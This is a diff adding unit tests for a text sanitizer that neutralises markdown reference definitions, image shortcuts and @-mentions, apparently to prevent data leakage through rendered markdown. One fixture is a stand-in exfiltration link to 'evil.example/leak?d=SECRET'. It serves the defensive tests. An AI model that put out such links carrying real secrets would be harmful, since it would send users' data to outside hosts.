@@ -43,6 +43,17 @@ def test_markdown_link_neutralized() -> None:
     assert "text" in out
 
 
+def test_markdown_reference_definition_neutralized() -> None:
+    out = sanitize('[x]: http://evil.example/leak?d=SECRET "t"')
+    assert "http://evil" not in out
+
+
+def test_markdown_shortcut_reference_neutralized() -> None:
+    out = sanitize("see reference ![x] here")
+    assert "![x]" not in out
+    assert "x" in out
+
+
 def test_mention_defused() -> None:
     out = sanitize("cc @maintainer please")
     assert "@maintainer" not in out
